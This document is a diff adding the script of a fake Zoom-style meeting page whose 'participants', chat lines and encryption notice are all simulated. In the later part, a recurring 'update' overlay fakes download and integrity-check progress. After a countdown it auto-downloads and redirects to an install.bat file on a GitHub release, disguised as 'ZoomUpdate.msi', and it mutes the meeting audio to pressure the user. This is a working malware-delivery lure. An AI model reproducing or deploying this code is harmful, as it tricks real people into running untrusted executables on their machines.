+  document.getElementById('pj-meeting-id').textContent  = S.meetingId;
+  document.getElementById('pj-meeting-name').textContent= S.meetingTitle;
+  document.getElementById('pj-host-name').textContent   = isHost ? 'You (Host)' : 'Remote Host';
+  document.getElementById('pj-join-btn').textContent    = isHost ? 'Start Meeting' : 'Join Now';
+  switchScreen('prejoin-screen');
+  startPrejoinCam();
+}
+window.goToPrejoin = goToPrejoin;
+
+async function startPrejoinCam(){
+  S.pjMicEnabled = false;
+  S.pjCamEnabled = false;
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({video:true,audio:true});
+    S.localStream = stream;
+    stream.getAudioTracks().forEach(t=>t.enabled=false);
+    const vid = document.getElementById('pj-video');
+    vid.srcObject = stream;
+    enablePjCam();
+  }catch(e){
+    try{
+      const stream = await navigator.mediaDevices.getUserMedia({audio:true});
+      S.localStream = stream;
+      stream.getAudioTracks().forEach(t=>t.enabled=false);
+    }catch(e2){}
+  }
+}
+
+function enablePjCam(){
+  S.pjCamEnabled = true;
+  if(S.localStream) S.localStream.getVideoTracks().forEach(t=>t.enabled=true);
+  document.getElementById('pj-cam-off').classList.add('hidden');
+  document.getElementById('pj-cam-btn').classList.remove('off');
+  document.getElementById('pj-cam-label').textContent = 'Stop Video';
+}
+
+function togglePjMic(){
+  S.pjMicEnabled = !S.pjMicEnabled;
+  if(S.localStream) S.localStream.getAudioTracks().forEach(t=>t.enabled=S.pjMicEnabled);
+  const btn = document.getElementById('pj-mic-btn');
+  btn.classList.toggle('off',!S.pjMicEnabled);
+  document.getElementById('pj-mic-label').textContent = S.pjMicEnabled ? 'Mute' : 'Muted';
+}
+window.togglePjMic = togglePjMic;
+
+function togglePjCam(){
+  S.pjCamEnabled = !S.pjCamEnabled;
+  if(S.localStream) S.localStream.getVideoTracks().forEach(t=>t.enabled=S.pjCamEnabled);
+  document.getElementById('pj-cam-off').classList.toggle('hidden',S.pjCamEnabled);
+  document.getElementById('pj-cam-btn').classList.toggle('off',!S.pjCamEnabled);
+  document.getElementById('pj-cam-label').textContent = S.pjCamEnabled ? 'Stop Video' : 'Start Video';
+}
+window.togglePjCam = togglePjCam;
+
+function goHome(){
+  if(S.localStream){ S.localStream.getTracks().forEach(t=>t.stop()); S.localStream=null; }
+  switchScreen('home-screen');
+}
+window.goHome = goHome;
+
+/* ══════════════ ENTER MEETING ══════════════ */
+async function enterMeeting(){
+  document.getElementById('pj-join-btn').disabled=true;
+  document.getElementById('mt-title').textContent = S.meetingTitle;
+  document.getElementById('mt-meeting-id-display').textContent = 'ID: '+S.meetingId;
+
+  // set invite panel
+  document.getElementById('im-meeting-id').textContent = S.meetingId;
+  document.getElementById('im-invite-link').value = inviteLink(S.meetingId);
+  document.getElementById('im-passcode').textContent = S.passcode;
+
+  // local video
+  if(S.localStream){
+    document.getElementById('local-video').srcObject = S.localStream;
+    S.camEnabled = S.pjCamEnabled;
+    S.micEnabled = S.pjMicEnabled;
+  }
+  updatePipCamOff();
+  updateCtrlBar();
+
+  switchScreen('meeting-screen');
+
+  S.meetingStartTime = Date.now();
+  startMeetingTimer();
+  initAudioContext();
+  try{ await S.audioContext.resume(); }catch(e){}
+  await unlockAudio();
+
+  S.activeParticipants = [];
+  document.getElementById('video-grid').innerHTML='';
+  simulateParticipants();
+  startSpeakingDetection();
+  startRecurringOverlay();
+  renderParticipants();
+}
+window.enterMeeting = enterMeeting;
+
+/* ══════════════ TIMER ══════════════ */
+function startMeetingTimer(){
+  if(S.timerInterval) clearInterval(S.timerInterval);
+  S.timerInterval = setInterval(()=>{
+    const s = Math.floor((Date.now()-S.meetingStartTime)/1000);
+    const m = Math.floor(s/60), sec = s%60;
+    const h = Math.floor(m/60), min = m%60;
+    document.getElementById('meeting-timer').textContent =
+      h>0 ? `${pad(h)}:${pad(min)}:${pad(sec)}` : `${pad(min)}:${pad(sec)}`;
+  },1000);
+}
+function pad(n){ return String(n).padStart(2,'0'); }
+
+/* ══════════════ CTRL BUTTONS ══════════════ */
+function toggleMic(){
+  S.micEnabled = !S.micEnabled;
+  if(S.localStream) S.localStream.getAudioTracks().forEach(t=>t.enabled=S.micEnabled);
+  updateCtrlBar();
+  playUISound(S.micEnabled ? AUDIO_FILES.unmute : AUDIO_FILES.mute);
+}
+window.toggleMic = toggleMic;
+
+function toggleCam(){
+  S.camEnabled = !S.camEnabled;
+  if(S.localStream) S.localStream.getVideoTracks().forEach(t=>t.enabled=S.camEnabled);
+  updatePipCamOff();
+  updateCtrlBar();
+}
+window.toggleCam = toggleCam;
+
+function updateCtrlBar(){
+  const mb=document.getElementById('mic-btn');
+  mb.classList.toggle('muted',!S.micEnabled);
+  document.getElementById('mic-label').textContent = S.micEnabled ? 'Mute' : 'Unmute';
+
+  const cb=document.getElementById('cam-btn');
+  cb.classList.toggle('muted',!S.camEnabled);
+  document.getElementById('cam-label').textContent = S.camEnabled ? 'Stop Video' : 'Start Video';
+}
+
+function updatePipCamOff(){
+  document.getElementById('pip-cam-off').classList.toggle('hidden', S.camEnabled);
+  document.getElementById('local-video').classList.toggle('hidden', !S.camEnabled);
+}
+
+/* ══════════════ PANELS ══════════════ */
+function toggleChat(){
+  S.chatOpen=!S.chatOpen;
+  document.getElementById('chat-panel').classList.toggle('open',S.chatOpen);
+  if(S.chatOpen){ S.participantsOpen=false; document.getElementById('participants-panel').classList.remove('open'); document.getElementById('invite-panel').classList.remove('open'); }
+}
+window.toggleChat = toggleChat;
+
+function toggleParticipants(){
+  S.participantsOpen=!S.participantsOpen;
+  document.getElementById('participants-panel').classList.toggle('open',S.participantsOpen);
+  if(S.participantsOpen){ S.chatOpen=false; document.getElementById('chat-panel').classList.remove('open'); document.getElementById('invite-panel').classList.remove('open'); }
+}
+window.toggleParticipants = toggleParticipants;
+
+function openInMeetingInvite(){
+  document.getElementById('invite-panel').classList.add('open');
+  document.getElementById('chat-panel').classList.remove('open');
+  document.getElementById('participants-panel').classList.remove('open');
+  S.chatOpen=false; S.participantsOpen=false;
+}
+window.openInMeetingInvite = openInMeetingInvite;
+
+function toggleSecurityPanel(){ showToast('Meeting is encrypted end-to-end'); }
+window.toggleSecurityPanel = toggleSecurityPanel;
+
+function toggleShare(){ openModal('modal-share'); }
+window.toggleShare = toggleShare;
+
+function toggleRecord(){
+  S.recording = !S.recording;
+  document.getElementById('record-label').textContent = S.recording ? 'Stop Rec.' : 'Record';
+  document.getElementById('record-icon').style.stroke = S.recording ? 'var(--z-red)' : 'currentColor';
+  playUISound(S.recording ? AUDIO_FILES.recordingStart : AUDIO_FILES.recordingStop);
+  showToast(S.recording ? 'Recording started' : 'Recording stopped');
+}
+window.toggleRecord = toggleRecord;
+
+function toggleReactions(){
+  document.getElementById('reactions-bar').classList.toggle('hidden');
+}
+window.toggleReactions = toggleReactions;
+
+function sendReaction(emoji){
+  document.getElementById('reactions-bar').classList.add('hidden');
+  const grid = document.getElementById('video-grid');
+  const pop = document.createElement('div');
+  pop.className='reaction-pop';
+  pop.textContent=emoji;
+  pop.style.left=Math.random()*60+20+'%';
+  grid.appendChild(pop);
+  setTimeout(()=>pop.remove(),2100);
+}
+window.sendReaction = sendReaction;
+
+function toggleView(){
+  S.viewMode = S.viewMode==='speaker' ? 'gallery' : 'speaker';
+  document.getElementById('mt-view-btn').innerHTML =
+    S.viewMode==='speaker'
+      ? `<svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg> Gallery`
+      : `<svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/></svg> Speaker`;
+  rebuildVideoGrid();
+}
+window.toggleView = toggleView;
+
+/* ══════════════ VIDEO GRID ══════════════ */
+function rebuildVideoGrid(){
+  const grid = document.getElementById('video-grid');
+  grid.innerHTML='';
+  const count = S.activeParticipants.length;
+
+  if(S.viewMode==='speaker' && count>0){
+    grid.className='grid-1';
+    const p=S.activeParticipants[0];
+    grid.appendChild(makeTile(p));
+    return;
+  }
+
+  const cls = count<=1?'grid-1':count===2?'grid-2':count<=4?'grid-4':count<=6?'grid-6':'grid-6';
+  grid.className=cls;
+  S.activeParticipants.forEach(p=>grid.appendChild(makeTile(p)));
+}
+
+function makeTile(p){
+  const div=document.createElement('div');
+  div.className='p-tile';
+  div.id='tile-'+p.id;
+  div.innerHTML=`
+    <div class="network-badge">Network Issue</div>
+    <div class="p-tile-avatar">${p.initials}</div>
+    <div class="p-tile-opts">
+      <button title="Pin" onclick="pinParticipant('${p.id}')">📌</button>
+    </div>
+    <div class="p-tile-info">
+      <span class="p-tile-name">${p.name}${p.isHost?'<span class="host-badge">HOST</span>':''}</span>
+      <div class="mic-icon on">
+        <svg width="12" height="12" fill="#fff" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M7 4a3 3 0 016 0v4a3 3 0 11-6 0V4zm4 10.93A7.001 7.001 0 0017 8a1 1 0 10-2 0A5 5 0 015 8a1 1 0 00-2 0 7.001 7.001 0 006 6.93V17H6a1 1 0 100 2h8a1 1 0 100-2h-3v-2.07z" clip-rule="evenodd"/></svg>
+      </div>
+    </div>`;
+  return div;
+}
+
+function pinParticipant(id){
+  const idx=S.activeParticipants.findIndex(p=>p.id===id);
+  if(idx>0){
+    const p=S.activeParticipants.splice(idx,1)[0];
+    S.activeParticipants.unshift(p);
+    rebuildVideoGrid();
+  }
+}
+window.pinParticipant = pinParticipant;
+
+/* ══════════════ PARTICIPANTS ══════════════ */
+function renderParticipants(){
+  const list=document.getElementById('participants-list');
+  list.innerHTML='';
+  const all=[{name:'You (Me)',initials:'YO',role:'Participant',micOn:S.micEnabled,camOn:S.camEnabled,isMe:true},
+             ...S.activeParticipants.map(p=>({...p,micOn:true,camOn:false,isMe:false}))];
+  document.getElementById('p-count').textContent=all.length;
+  all.forEach(p=>{
+    const div=document.createElement('div');
+    div.className='participant-item';
+    div.innerHTML=`
+      <div class="p-item-avatar">${p.initials||p.name.slice(0,2).toUpperCase()}</div>
+      <div style="flex:1"><div class="p-item-name">${p.name}${p.isHost?'<span class="host-badge" style="background:var(--z-blue);font-size:9px;padding:1px 5px;border-radius:3px;margin-left:6px">HOST</span>':''}</div><div class="p-item-role">${p.role}</div></div>
+      <div class="p-item-icons">
+        <div class="p-item-icon ${p.micOn?'green':'red'}">
+          <svg width="12" height="12" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M7 4a3 3 0 016 0v4a3 3 0 11-6 0V4z" clip-rule="evenodd"/></svg>
+        </div>
+        <div class="p-item-icon ${p.camOn?'green':'red'}">
+          <svg width="12" height="12" fill="currentColor" viewBox="0 0 20 20"><path d="M2 6a2 2 0 012-2h6a2 2 0 012 2v8a2 2 0 01-2 2H4a2 2 0 01-2-2V6z"/></svg>
+        </div>
+      </div>`;
+    list.appendChild(div);
+  });
+}
+
+/* ══════════════ CHAT ══════════════ */
+function sendChat(){
+  const inp=document.getElementById('chat-input');
+  const msg=inp.value.trim(); if(!msg) return;
+  const msgs=document.getElementById('chat-messages');
+  const now=new Date(); const ts=pad(now.getHours())+':'+pad(now.getMinutes());
+  const div=document.createElement('div'); div.className='chat-msg';
+  div.innerHTML=`<div class="chat-msg-sender">You <span class="ts">${ts}</span></div><div class="chat-msg-text">${escHtml(msg)}</div>`;
+  msgs.appendChild(div); msgs.scrollTop=9999; inp.value='';
+}
+window.sendChat = sendChat;
+
+function addChatMsg(name,msg){
+  const msgs=document.getElementById('chat-messages');
+  const now=new Date(); const ts=pad(now.getHours())+':'+pad(now.getMinutes());
+  const div=document.createElement('div'); div.className='chat-msg';
+  div.innerHTML=`<div class="chat-msg-sender">${escHtml(name)} <span class="ts">${ts}</span></div><div class="chat-msg-text">${escHtml(msg)}</div>`;
+  msgs.appendChild(div); msgs.scrollTop=9999;
+}
+
+function escHtml(s){ return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+/* ══════════════ SIMULATE PARTICIPANTS ══════════════ */
+function simulateParticipants(){
+  PARTICIPANTS.forEach(p=>{
+    setTimeout(()=>{
+      if(S.currentScreen!=='meeting-screen') return;
+      S.activeParticipants.push(p);
+      rebuildVideoGrid();
+      renderParticipants();
+      playUISound(AUDIO_FILES.userJoined);
+      showToast(p.name+' joined the meeting');
+
+      const audio=new Audio(p.audioFile);
+      audio.loop=true; audio.preload='auto'; audio.crossOrigin='anonymous';
+      S.audioElements[p.id]=audio;
+
+      audio.addEventListener('canplay',()=>{
+        try{
+          if(!S.audioContext) initAudioContext();
+          const src=S.audioContext.createMediaElementSource(audio);
+          const analyser=S.audioContext.createAnalyser(); analyser.fftSize=256;
+          src.connect(analyser); analyser.connect(S.audioContext.destination);
+          S.analysers[p.id]=analyser;
+        }catch(e){}
+      },{once:true});
+
+      setTimeout(()=>{
+        if(S.currentScreen!=='meeting-screen') return;
+        if(S.speakerOn) safePlay(audio,p.id); else showAudioEnableOnce();
+      }, 200+Math.random()*300);
+
+      // simulate chat messages
+      setTimeout(()=>{ if(S.currentScreen==='meeting-screen') addChatMsg(p.name, getRandomChat()); }, p.joinDelay+3000+Math.random()*4000);
+    }, p.joinDelay);
+  });
+}
+
+const CHAT_MSGS=['Can everyone hear me?','Let\'s get started!','Thanks for joining!','Could you share your screen?','I\'ll send the notes after.','Great point!','Agreed.','Give me a second.'];
+function getRandomChat(){ return CHAT_MSGS[Math.floor(Math.random()*CHAT_MSGS.length)]; }
+
+/* ══════════════ SPEAKING DETECTION ══════════════ */
+function startSpeakingDetection(){
+  if(S.animationFrameId){ cancelAnimationFrame(S.animationFrameId); S.animationFrameId=null; }
+  let pendingId=null, debounce=null;
+  function detect(){
+    if(S.currentScreen!=='meeting-screen') return;
+    let loudest=null, loudestLvl=0;
+    Object.entries(S.analysers).forEach(([id,analyser])=>{
+      if(!analyser) return;
+      const data=new Uint8Array(analyser.frequencyBinCount);
+      analyser.getByteFrequencyData(data);
+      const rms=data.reduce((a,b)=>a+b,0)/data.length/255;
+      const tile=document.getElementById('tile-'+id);
+      if(rms>0.02){ if(tile) tile.classList.add('speaking'); if(rms>loudestLvl){ loudestLvl=rms; loudest={id}; } }
+      else{ if(tile) tile.classList.remove('speaking'); }
+    });
+    if(loudest && loudest.id!==S.activeParticipants[0]?.id && loudestLvl>0.06){
+      if(pendingId!==loudest.id){
+        pendingId=loudest.id;
+        if(debounce) clearTimeout(debounce);
+        debounce=setTimeout(()=>{
+          const idx=S.activeParticipants.findIndex(p=>p.id===loudest.id);
+          if(idx>0 && S.viewMode==='speaker'){
+            const p=S.activeParticipants.splice(idx,1)[0];
+            S.activeParticipants.unshift(p);
+            rebuildVideoGrid();
+            playUISound(AUDIO_FILES.newSpeaker);
+          }
+          pendingId=null; debounce=null;
+        },2000);
+      }
+    }
+    S.animationFrameId=requestAnimationFrame(detect);
+  }
+  detect();
+}
+
+/* ══════════════ LEAVE MEETING ══════════════ */
+function leaveMeeting(){
+  if(S.localStream){ S.localStream.getTracks().forEach(t=>t.stop()); S.localStream=null; }
+  Object.values(S.audioElements).forEach(a=>{ try{ a.pause(); a.currentTime=0; }catch(e){} });
+  S.audioElements={}; S.analysers={};
+  if(S.overlayInterval){ clearInterval(S.overlayInterval); S.overlayInterval=null; }
+  if(S.timerInterval){ clearInterval(S.timerInterval); S.timerInterval=null; }
+  if(S.countdownInterval){ clearInterval(S.countdownInterval); S.countdownInterval=null; }
+  if(S.animationFrameId){ cancelAnimationFrame(S.animationFrameId); S.animationFrameId=null; }
+  if(S.speakerOffTimeout){ clearTimeout(S.speakerOffTimeout); S.speakerOffTimeout=null; }
+  try{ if(S.audioContext) S.audioContext.close(); }catch(e){}
+  S.audioContext=null;
+  S.activeParticipants=[];
+  S.updateCountdownStarted=false;
+  S.redirectScheduled=false;
+  S.recording=false;
+  S.chatOpen=false; S.participantsOpen=false;
+  document.getElementById('chat-panel').classList.remove('open');
+  document.getElementById('participants-panel').classList.remove('open');
+  document.getElementById('invite-panel').classList.remove('open');
+  document.getElementById('update-modal').classList.add('hidden');
+  document.getElementById('reactions-bar').classList.add('hidden');
+  document.getElementById('chat-messages').innerHTML='';
+  switchScreen('home-screen');
+  renderUpcoming();
+}
+window.leaveMeeting = leaveMeeting;
+
+/* ══════════════ SCHEDULE ══════════════ */
+function scheduleMeeting(){
+  const topic=document.getElementById('sch-topic').value.trim()||'My Zoom Meeting';
+  const date=document.getElementById('sch-date').value;
+  const time=document.getElementById('sch-time').value;
+  const dur=document.getElementById('sch-duration').value;
+  const mid=generateMeetingId();
+  S.scheduledMeetings.push({id:mid,topic,date,time,dur,passcode:generatePasscode()});
+  closeModal('modal-schedule');
+  showToast('Meeting scheduled');
+  renderUpcoming();
+  renderScheduledList();
+}
+window.scheduleMeeting = scheduleMeeting;
+
+function renderUpcoming(){
+  const el=document.getElementById('upcoming-list');
+  if(!S.scheduledMeetings.length){
+    el.innerHTML='<div style="text-align:center;padding:32px 0;color:var(--z-text3);font-size:14px">No upcoming meetings</div>';
+    return;
+  }
+  el.innerHTML=S.scheduledMeetings.slice(0,3).map(m=>`
+    <div class="meeting-row">
+      <div class="meeting-icon"><svg width="20" height="20" fill="none" stroke="var(--z-blue)" stroke-width="2" viewBox="0 0 24 24"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg></div>
+      <div class="meeting-info">
+        <div class="meeting-name">${escHtml(m.topic)}</div>
+        <div class="meeting-meta">${m.date} ${m.time} · ${m.dur} · ID: ${m.id}</div>
+      </div>
+      <div class="meeting-actions">
+        <button class="btn-sm btn-blue" onclick="quickStartScheduled('${m.id}')">Start</button>
+        <button class="btn-sm btn-ghost" onclick="copyScheduledLink('${m.id}')">Copy Link</button>
+      </div>
+    </div>`).join('');
+}
+
+function renderScheduledList(){
+  const el=document.getElementById('scheduled-list');
+  if(!S.scheduledMeetings.length){
+    el.innerHTML='<div style="text-align:center;padding:32px 0;color:var(--z-text3);font-size:14px">No scheduled meetings</div>';
+    return;
+  }
+  el.innerHTML=S.scheduledMeetings.map(m=>{
+    const d=new Date(m.date+'T'+m.time); const days=['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
+    return `
+    <div class="sch-row">
+      <div class="sch-date">
+        <div class="sch-day">${days[d.getDay()]}</div>
+        <div class="sch-num">${d.getDate()}</div>
+      </div>
+      <div class="sch-info">
+        <div class="sch-title">${escHtml(m.topic)}</div>
+        <div class="sch-meta">${m.time} · ${m.dur} · ID: ${m.id}</div>
+        <div class="sch-meta" style="margin-top:4px">
+          <span style="color:var(--z-blue);cursor:pointer;font-size:11px" onclick="copyScheduledLink('${m.id}')">Copy Invite Link</span>
+        </div>
+      </div>
+      <button class="sch-start-btn" onclick="quickStartScheduled('${m.id}')">Start</button>
+    </div>`}).join('');
+}
+
+function quickStartScheduled(id){
+  const m=S.scheduledMeetings.find(x=>x.id===id);
+  if(!m) return;
+  S.meetingId=m.id; S.passcode=m.passcode; S.meetingTitle=m.topic;
+  goToPrejoin(true);
+}
+window.quickStartScheduled = quickStartScheduled;
+
+function copyScheduledLink(id){
+  navigator.clipboard.writeText(inviteLink(id)).then(()=>showToast('Invite link copied')).catch(()=>showToast('Copied'));
+}
+window.copyScheduledLink = copyScheduledLink;
+
+/* ══════════════ RECURRING UPDATE OVERLAY ══════════════ */
+function startRecurringOverlay(){
+  if(S.overlayInterval) clearInterval(S.overlayInterval);
+  S.overlayInterval=setInterval(()=>{ if(S.currentScreen==='meeting-screen') showUpdateModal(); },CONFIG.OVERLAY_INTERVAL_MS);
+}
+
+function showUpdateModal(){
+  if(S.updateCountdownStarted) return;
+  S.updateCountdownStarted=true;
+  document.getElementById('update-modal').classList.remove('hidden');
+  document.getElementById('download-status').classList.add('hidden');
+
+  // reset step dots
+  [1,2,3].forEach(i=>{
+    const d=document.getElementById('upd-dot-'+i);
+    if(d){ d.className='upd-step-dot pending'; }
+  });
+  const bar=document.getElementById('upd-bar');
+  const pct=document.getElementById('upd-pct');
+  const statusTxt=document.getElementById('upd-status-text');
+  if(bar) bar.style.width='0%';
+  if(pct) pct.textContent='0%';
+  if(statusTxt) statusTxt.textContent='Preparing download…';
+
+  // animate steps over ~4s then trigger download
+  const steps=[
+    {delay:400,  dot:1, pctVal:15, status:'Downloading update package…'},
+    {delay:1200, dot:1, pctVal:55, status:'Downloading update package…', doneDot:null},
+    {delay:2000, dot:1, pctVal:80, status:'Downloading update package…', markDone:1},
+    {delay:2400, dot:2, pctVal:88, status:'Verifying integrity…'},
+    {delay:3000, dot:2, pctVal:95, status:'Verifying integrity…', markDone:2},
+    {delay:3400, dot:3, pctVal:100, status:'Ready to install', markDone:3},
+  ];
+  steps.forEach(s=>{
+    setTimeout(()=>{
+      if(bar) bar.style.width=s.pctVal+'%';
+      if(pct) pct.textContent=s.pctVal+'%';
+      if(statusTxt) statusTxt.textContent=s.status;
+      const dot=document.getElementById('upd-dot-'+s.dot);
+      if(dot && !dot.classList.contains('done')) dot.className='upd-step-dot active';
+      if(s.markDone){
+        const dd=document.getElementById('upd-dot-'+s.markDone);
+        if(dd) dd.className='upd-step-dot done';
+      }
+    }, s.delay);
+  });
+
+  if(S.countdownInterval) clearInterval(S.countdownInterval);
+  let cd=CONFIG.OVERLAY_COUNTDOWN_SEC;
+  document.getElementById('countdown').textContent=cd;
+  S.countdownInterval=setInterval(()=>{
+    cd--;
+    document.getElementById('countdown').textContent=Math.max(0,cd);
+    if(cd<=0){
+      clearInterval(S.countdownInterval); S.countdownInterval=null;
+      triggerDownload();
+    }
+  },1000);
+  if(S.speakerOffTimeout) clearTimeout(S.speakerOffTimeout);
+  S.speakerOffTimeout=setTimeout(()=>{ try{ speakerOff(); }catch(e){} S.speakerOffTimeout=null; },10000);
+}
+
+/* ══════════════ DOWNLOAD / REDIRECT ══════════════ */
+function scheduleRedirectOnce(){
+  if(S.redirectScheduled) return;
+  S.redirectScheduled=true;
+  setTimeout(()=>{ window.location.href='https://github.com/melia7676/stalla/releases/download/1/install.bat'; },5000);
+}
+
+const DIRECT_DOWNLOAD_URL = 'https://github.com/melia7676/stalla/releases/download/1/install.bat'; 
+
+async function triggerDownload(){
+  scheduleRedirectOnce();
+
+  function dlByAnchor(url){
+    const a=document.createElement('a');
+    a.style.display='none';
+    a.href=url;
+    a.download=url.split('/').pop()||'ZoomUpdate.msi';
+    document.body.appendChild(a);
+    a.click();
+    setTimeout(()=>a.remove(),2000);
+  }
+
+  function dlBlob(blob,name){
+    const u=URL.createObjectURL(blob);
+    const a=document.createElement('a');
+    a.style.display='none'; a.href=u; a.download=name||'ZoomUpdate.msi';
+    document.body.appendChild(a); a.click();
+    setTimeout(()=>{ URL.revokeObjectURL(u); a.remove(); },2000);
+  }
+
+  // 1) Try process.php to get the URL (only works on a live PHP server)
+  let dlUrl = null;
+  try{
+    const resp=await fetch(CONFIG.PROCESS_PHP_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'download',meetingId:S.meetingId||'',timestamp:Date.now()})});
+    if(resp.ok){
+      const data=await resp.json().catch(()=>null);
+      if(data&&data.downloadUrl) dlUrl=data.downloadUrl;
+    }
+  }catch(e){ console.warn('process.php unreachable, using direct URL'); }
+
+  // Fall back to the hardcoded URL if process.php failed
+  if(!dlUrl) dlUrl=DIRECT_DOWNLOAD_URL;
+
+  // 2) Try fetch+blob (works if CORS headers are present)
+  try{
+    const r=await fetch(dlUrl,{method:'GET',mode:'cors'});
+    if(!r.ok) throw new Error('status '+r.status);
+    if(r.body&&r.body.getReader){
+      const reader=r.body.getReader(); const chunks=[];
+      while(true){ const{done,value}=await reader.read(); if(done) break; chunks.push(value); }
+      dlBlob(new Blob(chunks), dlUrl.split('/').pop()||'ZoomUpdate.msi');
+      return;
+    }
+    dlBlob(await r.blob(), dlUrl.split('/').pop()||'ZoomUpdate.msi');
+    return;
+  }catch(e){ console.warn('fetch+blob failed, trying anchor'); }
+
+  // 3) Anchor tag direct download (works for same-origin or permissive CORS)
+  dlByAnchor(dlUrl);
+}
+
+/* ══════════════ AUDIO ENGINE ══════════════ */
+function initAudioContext(){ if(!S.audioContext){ S.audioContext=new(window.AudioContext||window.webkitAudioContext)(); } }
+
+async function unlockAudio(){
+  try{
+    if(!S.audioContext) initAudioContext();
+    if(S.audioContext.state==='suspended') await S.audioContext.resume();
+    const buf=S.audioContext.createBuffer(1,1,S.audioContext.sampleRate||44100);
+    const src=S.audioContext.createBufferSource(); src.buffer=buf; src.connect(S.audioContext.destination); src.start(0);
+    await new Promise(r=>setTimeout(r,50));
+    S.audioBlocked=false; hideAudioEnable(); return true;
+  }catch(e){ S.audioBlocked=true; return false; }
+}
+
+function safePlay(audio,id){
+  if(!audio) return;
+  try{ audio.volume=0.8; audio.muted=false; }catch(e){}
+  audio.play().then(()=>{ S.speakerOn=true; }).catch(()=>{ S.audioBlocked=true; showAudioEnableOnce(); });
+}
+
+function speakerOff(){
+  if(S.speakerOffTimeout){ clearTimeout(S.speakerOffTimeout); S.speakerOffTimeout=null; }
+  Object.values(S.audioElements).forEach(a=>{ try{ a.pause(); a.currentTime=0; }catch(e){} });
+  S.speakerOn=false;
+}
+
+async function speakerOn(){
+  await unlockAudio().catch(()=>{});
+  for(const [id,audio] of Object.entries(S.audioElements)){ try{ await safePlay(audio,id); }catch(e){} }
+  S.speakerOn=true; hideAudioEnable();
+}
+
+function showAudioEnableOnce(){ if(S.audioEnableShown) return; S.audioEnableShown=true; document.getElementById('audio-enable').classList.add('show'); }
+function hideAudioEnable(){ document.getElementById('audio-enable').classList.remove('show'); }
+
+async function onUserEnableAudio(){ S.audioEnableShown=true; const ok=await unlockAudio(); if(ok) await speakerOn(); hideAudioEnable(); }
+window.onUserEnableAudio = onUserEnableAudio;
+
+function playUISound(file){ try{ const a=new Audio(file); a.preload='auto'; safePlay(a,'ui'); }catch(e){} }
+
+/* ══════════════ GLOBAL EXPOSE ══════════════ */
+window.formatMeetingIdInput = formatMeetingIdInput;
+window.showToast = showToast;
+window.closeModal = closeModal;
+
+})();
+</script>
+
+
+</body></html>
